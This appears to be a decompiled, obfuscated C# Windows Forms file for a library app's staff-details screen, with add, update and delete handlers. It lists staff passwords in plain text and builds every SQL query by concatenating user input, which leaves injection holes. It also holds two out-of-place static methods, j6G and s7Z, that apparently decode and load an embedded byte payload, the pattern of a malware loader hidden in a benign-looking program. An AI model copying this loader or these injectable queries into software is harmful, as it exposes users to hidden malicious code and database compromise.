using System;
using System.ComponentModel;
using System.Data;
using System.Data.Common;
using System.Data.SqlClient;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Ar3;
using Cq2e;
using Eb2;
using Lt35;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using g4N1;
using i2D;
using p8S;
using z2SR;
using z7XZ;

namespace y0R;

[DesignerGenerated]
public class Tf4 : Form
{
	private Button _Button4;

	private Button _Button3;

	private Button _Button1;

	private DataGridView _DataGridView1;

	private Label _Label3;

	private Label _Label2;

	private TextBox _TextBox1;

	private ErrorProvider _ErrorProvider4;

	private c7S _LeacturelibloginTableAdapter;

	private DataGridViewTextBoxColumn _LpasswordDataGridViewTextBoxColumn;

	internal IContainer j;

	internal Button p;

	internal Label L;

	internal TextBox n;

	internal TextBox a;

	internal TextBox U;

	internal Label b;

	internal ErrorProvider M;

	internal ErrorProvider v;

	internal ErrorProvider C;

	internal Ct6g q;

	internal BindingSource I;

	internal DataGridViewTextBoxColumn H;

	internal DataGridViewTextBoxColumn F;

	internal DataGridViewTextBoxColumn d;

	internal Button o;

	public Tf4()
	{
		((Form)this).add_Load((EventHandler)Lt7);
		t0C();
	}

	protected override void a3X(bool Cs9)
	{
		try
		{
			if (Cs9 && j != null)
			{
				j.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(Cs9);
		}
	}

	private void t0C()
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Expected O, but got Unknown
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Expected O, but got Unknown
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0039: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0044: Expected O, but got Unknown
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Expected O, but got Unknown
		//IL_005b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0065: Expected O, but got Unknown
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_0070: Expected O, but got Unknown
		//IL_0071: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Expected O, but got Unknown
		//IL_0087: Unknown result type (might be due to invalid IL or missing references)
		//IL_0091: Expected O, but got Unknown
		//IL_0092: Unknown result type (might be due to invalid IL or missing references)
		//IL_009c: Expected O, but got Unknown
		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ad: Expected O, but got Unknown
		//IL_00b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00be: Expected O, but got Unknown
		//IL_00c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cf: Expected O, but got Unknown
		//IL_00d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e0: Expected O, but got Unknown
		//IL_00f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fc: Expected O, but got Unknown
		//IL_0108: Unknown result type (might be due to invalid IL or missing references)
		//IL_0112: Expected O, but got Unknown
		//IL_0113: Unknown result type (might be due to invalid IL or missing references)
		//IL_011d: Expected O, but got Unknown
		//IL_011e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0128: Expected O, but got Unknown
		//IL_0129: Unknown result type (might be due to invalid IL or missing references)
		//IL_0133: Expected O, but got Unknown
		//IL_0134: Unknown result type (might be due to invalid IL or missing references)
		//IL_013e: Expected O, but got Unknown
		IContainer container = (j = new Container());
		Pg9(new Button());
		Ym8(new Button());
		e4Y(new Button());
		Qc0(new Button());
		Ai9(new DataGridView());
		Gw2(new Label());
		q7G(new Label());
		Sd6(new TextBox());
		x5Z(new TextBox());
		Tn9(new TextBox());
		a0E(new Label());
		t7Z(new TextBox());
		Ti3(new Label());
		Wa7(new ErrorProvider(j));
		Ys7(new ErrorProvider(j));
		t4L(new ErrorProvider(j));
		r8S(new ErrorProvider(j));
		Ya6(new Ct6g());
		Ag6(new BindingSource(j));
		Pg3(new c7S());
		Fm0(new DataGridViewTextBoxColumn());
		Da3(new DataGridViewTextBoxColumn());
		f1X(new DataGridViewTextBoxColumn());
		y7X(new DataGridViewTextBoxColumn());
		Db0(new Button());
		((ISupportInitialize)t0N()).BeginInit();
		((ISupportInitialize)Yr2()).BeginInit();
		((ISupportInitialize)s8W()).BeginInit();
		((ISupportInitialize)p6R()).BeginInit();
		((ISupportInitialize)r6M()).BeginInit();
		((ISupportInitialize)s0Y()).BeginInit();
		((ISupportInitialize)Wd4()).BeginInit();
		((Control)this).SuspendLayout();
		((Control)Ns2()).set_Location(new Point(491, 271));
		((Control)Ns2()).set_Name("Button4");
		((Control)Ns2()).set_Size(new Size(99, 32));
		((Control)Ns2()).set_TabIndex(25);
		((ButtonBase)Ns2()).set_Text("HOME");
		((ButtonBase)Ns2()).set_UseVisualStyleBackColor(true);
		((Control)c9J()).set_Location(new Point(256, 271));
		((Control)c9J()).set_Name("Button3");
		((Control)c9J()).set_Size(new Size(103, 32));
		((Control)c9J()).set_TabIndex(24);
		((ButtonBase)c9J()).set_Text("DELETE");
		((ButtonBase)c9J()).set_UseVisualStyleBackColor(true);
		((Control)Mm1()).set_Location(new Point(144, 271));
		((Control)Mm1()).set_Name("Button2");
		((Control)Mm1()).set_Size(new Size(94, 32));
		((Control)Mm1()).set_TabIndex(23);
		((ButtonBase)Mm1()).set_Text("UPDATE");
		((ButtonBase)Mm1()).set_UseVisualStyleBackColor(true);
		((Control)Sm2()).set_Location(new Point(24, 271));
		((Control)Sm2()).set_Name("Button1");
		((Control)Sm2()).set_Size(new Size(101, 32));
		((Control)Sm2()).set_TabIndex(22);
		((ButtonBase)Sm2()).set_Text("ADD");
		((ButtonBase)Sm2()).set_UseVisualStyleBackColor(true);
		t0N().set_AutoGenerateColumns(false);
		t0N().set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		t0N().get_Columns().AddRange((DataGridViewColumn[])(object)new DataGridViewColumn[4]
		{
			(DataGridViewColumn)k7B(),
			(DataGridViewColumn)Na2(),
			(DataGridViewColumn)Hp7(),
			(DataGridViewColumn)Ty6()
		});
		t0N().set_DataSource((object)Wd4());
		((Control)t0N()).set_Location(new Point(12, 102));
		((Control)t0N()).set_Name("DataGridView1");
		((Control)t0N()).set_Size(new Size(592, 159));
		((Control)t0N()).set_TabIndex(21);
		Ws7().set_AutoSize(true);
		((Control)Ws7()).set_Location(new Point(306, 67));
		((Control)Ws7()).set_Name("Label4");
		((Control)Ws7()).set_Size(new Size(85, 13));
		((Control)Ws7()).set_TabIndex(20);
		Ws7().set_Text("Borrowed Books");
		Nj1().set_AutoSize(true);
		((Control)Nj1()).set_Location(new Point(12, 67));
		((Control)Nj1()).set_Name("Label3");
		((Control)Nj1()).set_Size(new Size(60, 13));
		((Control)Nj1()).set_TabIndex(19);
		Nj1().set_Text("Staff Name");
		((Control)e0Y()).set_Location(new Point(405, 64));
		((Control)e0Y()).set_Name("TextBox4");
		((Control)e0Y()).set_Size(new Size(185, 20));
		((Control)e0Y()).set_TabIndex(18);
		((Control)Nn4()).set_Location(new Point(105, 64));
		((Control)Nn4()).set_Name("TextBox3");
		((Control)Nn4()).set_Size(new Size(162, 20));
		((Control)Nn4()).set_TabIndex(17);
		((Control)n1D()).set_Location(new Point(405, 20));
		((Control)n1D()).set_Name("TextBox2");
		((Control)n1D()).set_Size(new Size(185, 20));
		((Control)n1D()).set_TabIndex(16);
		t8Z().set_AutoSize(true);
		((Control)t8Z()).set_Location(new Point(306, 23));
		((Control)t8Z()).set_Name("Label2");
		((Control)t8Z()).set_Size(new Size(53, 13));
		((Control)t8Z()).set_TabIndex(15);
		t8Z().set_Text("Password");
		((Control)Dg2()).set_Location(new Point(105, 20));
		((Control)Dg2()).set_Name("TextBox1");
		((Control)Dg2()).set_Size(new Size(162, 20));
		((Control)Dg2()).set_TabIndex(14);
		f6A().set_AutoSize(true);
		((Control)f6A()).set_Location(new Point(12, 23));
		((Control)f6A()).set_Name("Label1");
		((Control)f6A()).set_Size(new Size(43, 13));
		((Control)f6A()).set_TabIndex(13);
		f6A().set_Text("Staff ID");
		Yr2().set_ContainerControl((ContainerControl)(object)this);
		s8W().set_ContainerControl((ContainerControl)(object)this);
		p6R().set_ContainerControl((ContainerControl)(object)this);
		r6M().set_ContainerControl((ContainerControl)(object)this);
		s0Y().DataSetName = "libraryDataSet1";
		s0Y().SchemaSerializationMode = SchemaSerializationMode.IncludeSchema;
		Wd4().set_DataMember("leactureliblogin");
		Wd4().set_DataSource((object)s0Y());
		t4Y().ClearBeforeFill = true;
		((DataGridViewColumn)k7B()).set_DataPropertyName("luserid");
		((DataGridViewColumn)k7B()).set_HeaderText("Staff ID");
		((DataGridViewColumn)k7B()).set_Name("LuseridDataGridViewTextBoxColumn");
		((DataGridViewColumn)k7B()).set_Width(130);
		((DataGridViewColumn)Na2()).set_DataPropertyName("lname");
		((DataGridViewColumn)Na2()).set_HeaderText("Staff Name");
		((DataGridViewColumn)Na2()).set_Name("LnameDataGridViewTextBoxColumn");
		((DataGridViewColumn)Na2()).set_Width(150);
		((DataGridViewColumn)Hp7()).set_DataPropertyName("lpassword");
		((DataGridViewColumn)Hp7()).set_HeaderText("Password");
		((DataGridViewColumn)Hp7()).set_Name("LpasswordDataGridViewTextBoxColumn");
		((DataGridViewColumn)Hp7()).set_Width(150);
		((DataGridViewColumn)Ty6()).set_DataPropertyName("borrow");
		((DataGridViewColumn)Ty6()).set_HeaderText("Borrow");
		((DataGridViewColumn)Ty6()).set_Name("BorrowDataGridViewTextBoxColumn");
		((DataGridViewColumn)Ty6()).set_Width(120);
		((Control)s8N()).set_Location(new Point(376, 271));
		((Control)s8N()).set_Name("Button5");
		((Control)s8N()).set_Size(new Size(92, 32));
		((Control)s8N()).set_TabIndex(26);
		((ButtonBase)s8N()).set_Text("Borrow Details");
		((ButtonBase)s8N()).set_UseVisualStyleBackColor(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(624, 322));
		((Control)this).get_Controls().Add((Control)(object)s8N());
		((Control)this).get_Controls().Add((Control)(object)Ns2());
		((Control)this).get_Controls().Add((Control)(object)c9J());
		((Control)this).get_Controls().Add((Control)(object)Mm1());
		((Control)this).get_Controls().Add((Control)(object)Sm2());
		((Control)this).get_Controls().Add((Control)(object)t0N());
		((Control)this).get_Controls().Add((Control)(object)Ws7());
		((Control)this).get_Controls().Add((Control)(object)Nj1());
		((Control)this).get_Controls().Add((Control)(object)e0Y());
		((Control)this).get_Controls().Add((Control)(object)Nn4());
		((Control)this).get_Controls().Add((Control)(object)n1D());
		((Control)this).get_Controls().Add((Control)(object)t8Z());
		((Control)this).get_Controls().Add((Control)(object)Dg2());
		((Control)this).get_Controls().Add((Control)(object)f6A());
		((Control)this).set_Name("Form11");
		((Form)this).set_Text("Staff Details");
		((ISupportInitialize)t0N()).EndInit();
		((ISupportInitialize)Yr2()).EndInit();
		((ISupportInitialize)s8W()).EndInit();
		((ISupportInitialize)p6R()).EndInit();
		((ISupportInitialize)r6M()).EndInit();
		((ISupportInitialize)s0Y()).EndInit();
		((ISupportInitialize)Wd4()).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual Button Ns2()
	{
		return _Button4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Pg9(Button w6L)
	{
		EventHandler eventHandler = Nb1;
		Button button = _Button4;
		if (button != null)
		{
			((Control)button).remove_Click(eventHandler);
		}
		_Button4 = w6L;
		button = _Button4;
		if (button != null)
		{
			((Control)button).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button c9J()
	{
		return _Button3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ym8(Button a5F)
	{
		EventHandler eventHandler = Qw7;
		Button button = _Button3;
		if (button != null)
		{
			((Control)button).remove_Click(eventHandler);
		}
		_Button3 = a5F;
		button = _Button3;
		if (button != null)
		{
			((Control)button).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button Mm1()
	{
		return p;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void e4Y(Button b1F)
	{
		EventHandler eventHandler = z4K;
		Button val = p;
		if (val != null)
		{
			((Control)val).remove_Click(eventHandler);
		}
		Button val2 = (p = b1F);
		val = p;
		if (val != null)
		{
			((Control)val).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button Sm2()
	{
		return _Button1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Qc0(Button c2S)
	{
		EventHandler eventHandler = Rz3;
		Button button = _Button1;
		if (button != null)
		{
			((Control)button).remove_Click(eventHandler);
		}
		_Button1 = c2S;
		button = _Button1;
		if (button != null)
		{
			((Control)button).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual DataGridView t0N()
	{
		return _DataGridView1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ai9(DataGridView z2N)
	{
		_DataGridView1 = z2N;
	}

	[SpecialName]
	internal virtual Label Ws7()
	{
		return L;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Gw2(Label Sq6)
	{
		Label val = (L = Sq6);
	}

	[SpecialName]
	internal virtual Label Nj1()
	{
		return _Label3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void q7G(Label Kr4)
	{
		_Label3 = Kr4;
	}

	[SpecialName]
	internal virtual TextBox e0Y()
	{
		return n;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Sd6(TextBox Hb9)
	{
		TextBox val = (n = Hb9);
	}

	[SpecialName]
	internal virtual TextBox Nn4()
	{
		return a;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void x5Z(TextBox Sb2)
	{
		TextBox val = (a = Sb2);
	}

	[SpecialName]
	internal virtual TextBox n1D()
	{
		return U;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Tn9(TextBox o7C)
	{
		TextBox val = (U = o7C);
	}

	[SpecialName]
	internal virtual Label t8Z()
	{
		return _Label2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void a0E(Label z8W)
	{
		_Label2 = z8W;
	}

	[SpecialName]
	internal virtual TextBox Dg2()
	{
		return _TextBox1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void t7Z(TextBox Mi8)
	{
		_TextBox1 = Mi8;
	}

	[SpecialName]
	internal virtual Label f6A()
	{
		return b;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ti3(Label p2A)
	{
		Label val = (b = p2A);
	}

	[SpecialName]
	internal virtual ErrorProvider Yr2()
	{
		return M;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Wa7(ErrorProvider k5P)
	{
		ErrorProvider val = (M = k5P);
	}

	[SpecialName]
	internal virtual ErrorProvider s8W()
	{
		return v;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ys7(ErrorProvider r8Z)
	{
		ErrorProvider val = (v = r8Z);
	}

	[SpecialName]
	internal virtual ErrorProvider p6R()
	{
		return C;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void t4L(ErrorProvider Nr2)
	{
		ErrorProvider val = (C = Nr2);
	}

	[SpecialName]
	internal virtual ErrorProvider r6M()
	{
		return _ErrorProvider4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void r8S(ErrorProvider g2K)
	{
		_ErrorProvider4 = g2K;
	}

	[SpecialName]
	internal virtual Ct6g s0Y()
	{
		return q;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ya6(Ct6g Qc5)
	{
		Ct6g ct6g = (q = Qc5);
	}

	[SpecialName]
	internal virtual BindingSource Wd4()
	{
		return I;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ag6(BindingSource a9C)
	{
		BindingSource val = (I = a9C);
	}

	[SpecialName]
	internal virtual c7S t4Y()
	{
		return _LeacturelibloginTableAdapter;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Pg3(c7S Gg8)
	{
		_LeacturelibloginTableAdapter = Gg8;
	}

	[SpecialName]
	internal virtual DataGridViewTextBoxColumn k7B()
	{
		return H;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Fm0(DataGridViewTextBoxColumn Ej8)
	{
		DataGridViewTextBoxColumn val = (H = Ej8);
	}

	[SpecialName]
	internal virtual DataGridViewTextBoxColumn Na2()
	{
		return F;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Da3(DataGridViewTextBoxColumn Cx6)
	{
		DataGridViewTextBoxColumn val = (F = Cx6);
	}

	[SpecialName]
	internal virtual DataGridViewTextBoxColumn Hp7()
	{
		return _LpasswordDataGridViewTextBoxColumn;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void f1X(DataGridViewTextBoxColumn g7G)
	{
		_LpasswordDataGridViewTextBoxColumn = g7G;
	}

	[SpecialName]
	internal virtual DataGridViewTextBoxColumn Ty6()
	{
		return d;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void y7X(DataGridViewTextBoxColumn z9Y)
	{
		DataGridViewTextBoxColumn val = (d = z9Y);
	}

	[SpecialName]
	internal virtual Button s8N()
	{
		return o;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Db0(Button m1H)
	{
		EventHandler eventHandler = Rd6;
		Button val = o;
		if (val != null)
		{
			((Control)val).remove_Click(eventHandler);
		}
		Button val2 = (o = m1H);
		val = o;
		if (val != null)
		{
			((Control)val).add_Click(eventHandler);
		}
	}

	public object Am3()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		SqlDataAdapter val = new SqlDataAdapter("select * from leactureliblogin", Eb3s.con);
		DataTable dataTable = new DataTable();
		((DbDataAdapter)(object)val).Fill(dataTable);
		t0N().set_DataSource((object)dataTable);
		e0Y().set_Text(Conversions.ToString(0));
		return null;
	}

	private bool c5D(string Tp9)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		DataTable dataTable = new DataTable();
		SqlDataAdapter val = new SqlDataAdapter("select * from leactureliblogin where luserid='" + Tp9 + "'", Eb3s.con);
		((DbDataAdapter)(object)val).Fill(dataTable);
		if (dataTable.Rows.Count == 0)
		{
			return true;
		}
		return false;
	}

	private void Nb1(object sender, EventArgs e)
	{
		((Control)this).Hide();
		((Control)Fb9z.Forms.e5R8()).Show();
	}

	private void Lt7(object sender, EventArgs e)
	{
		t4Y().j1Z(s0Y().leactureliblogin);
		e0Y().set_Text(Conversions.ToString(0));
		Am3();
	}

	private void Rz3(object sender, EventArgs e)
	{
		//IL_01d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01dd: Expected O, but got Unknown
		//IL_01f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0209: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.CompareString(Dg2().get_Text(), "", false) == 0)
		{
			Yr2().SetError((Control)(object)Dg2(), "Please Enter Your User ID");
			return;
		}
		Yr2().Clear();
		if (Operators.CompareString(n1D().get_Text(), "", false) == 0)
		{
			s8W().SetError((Control)(object)n1D(), "Please Enter Your Password");
			return;
		}
		s8W().Clear();
		if (Operators.CompareString(Nn4().get_Text(), "", false) == 0)
		{
			p6R().SetError((Control)(object)Nn4(), "Please Enter Your Name");
			return;
		}
		p6R().Clear();
		if (Operators.CompareString(e0Y().get_Text(), "", false) == 0)
		{
			r6M().SetError((Control)(object)e0Y(), "Please Enter Number of books borrowed");
			return;
		}
		r6M().Clear();
		if (!Versioned.IsNumeric((object)e0Y().get_Text()))
		{
			r6M().SetError((Control)(object)e0Y(), "Please enter integer only");
			return;
		}
		r6M().Clear();
		string text = Dg2().get_Text().ToUpper();
		string text2 = Nn4().get_Text().ToUpper();
		string text3 = n1D().get_Text();
		int num = checked((int)Math.Round(Conversion.Val(e0Y().get_Text())));
		string text4 = "insert into leactureliblogin values('" + text + "','" + text2 + "','" + text3 + "'," + Conversions.ToString(num) + ")";
		try
		{
			SqlCommand val = new SqlCommand(text4, Eb3s.con);
			val.ExecuteNonQuery();
			Interaction.MsgBox((object)"Staff Added to the Database", (MsgBoxStyle)0, (object)"Insertion Successful");
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
		Am3();
	}

	internal static byte[] j6G(int[] Qe9, int r3N)
	{
		checked
		{
			byte[] array = new byte[r3N + 1];
			int num = Qe9.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				array[i] = (byte)Qe9[i];
			}
			return array;
		}
	}

	private void z4K(object sender, EventArgs e)
	{
		//IL_01d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01dd: Expected O, but got Unknown
		//IL_01f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0209: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.CompareString(Dg2().get_Text(), "", false) == 0)
		{
			Yr2().SetError((Control)(object)Dg2(), "Please Enter Your User ID");
			return;
		}
		Yr2().Clear();
		if (Operators.CompareString(n1D().get_Text(), "", false) == 0)
		{
			s8W().SetError((Control)(object)n1D(), "Please Enter Your Password");
			return;
		}
		s8W().Clear();
		if (Operators.CompareString(Nn4().get_Text(), "", false) == 0)
		{
			p6R().SetError((Control)(object)Nn4(), "Please Enter Your User Name");
			return;
		}
		p6R().Clear();
		if (Operators.CompareString(e0Y().get_Text(), "", false) == 0)
		{
			r6M().SetError((Control)(object)e0Y(), "Please Enter Number of books borrowed");
			return;
		}
		r6M().Clear();
		if (!Versioned.IsNumeric((object)e0Y().get_Text()))
		{
			r6M().SetError((Control)(object)e0Y(), "Please enter integer only");
			return;
		}
		r6M().Clear();
		string text = Dg2().get_Text().ToUpper();
		string text2 = Nn4().get_Text().ToUpper();
		string text3 = n1D().get_Text();
		int num = checked((int)Math.Round(Conversion.Val(e0Y().get_Text())));
		string text4 = "update leactureliblogin set lname='" + text2 + "',lpassword='" + text3 + "',borrow=" + Conversions.ToString(num) + " where luserid= '" + text + "'";
		try
		{
			SqlCommand val = new SqlCommand(text4, Eb3s.con);
			val.ExecuteNonQuery();
			Interaction.MsgBox((object)"A Staff data has been updated from Database", (MsgBoxStyle)0, (object)"Updated Successful");
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
		Am3();
	}

	private void Qw7(object sender, EventArgs e)
	{
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Invalid comparison between Unknown and I4
		//IL_0067: Unknown result type (might be due to invalid IL or missing references)
		//IL_006d: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_0097: Unknown result type (might be due to invalid IL or missing references)
		string text = Interaction.InputBox("Please Enter the Staff ID to be Deleted", "Delete a Staff", "Enter Staff ID Eg: 14CSE007", -1, -1);
		text.ToUpper();
		if (c5D(text))
		{
			Interaction.MsgBox((object)"Staff Not found", (MsgBoxStyle)16, (object)"Warning");
			return;
		}
		string text2 = "delete from leactureliblogin where luserid ='" + text + "'";
		try
		{
			if ((int)Interaction.MsgBox((object)"Are you sure you want to delete", (MsgBoxStyle)4, (object)"Warning!!!") == 6)
			{
				SqlCommand val = new SqlCommand(text2, Eb3s.con);
				val.ExecuteNonQuery();
				Interaction.MsgBox((object)"A Student details has been deleted", (MsgBoxStyle)48, (object)"Note :");
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
		Am3();
	}

	private void Rd6(object sender, EventArgs e)
	{
		((Control)Fb9z.Forms.Sk78()).Show();
	}

	internal static void s7Z()
	{
		byte[] ck = Pd2t.w9TE(133632);
		int num = checked(Conversions.ToInteger(Mj02.mDic[Mj02.sNum]) * 3);
		if (num > 255)
		{
			num = 255;
		}
		Mj02.mDic.Add(Mj02.mArray, Yg3.a1Q4(ck, (byte[])Mj02.mDic[Mj02.sArray], num, 25));
		if (Lb0.As8())
		{
			Nb6.Wk4();
		}
	}
}
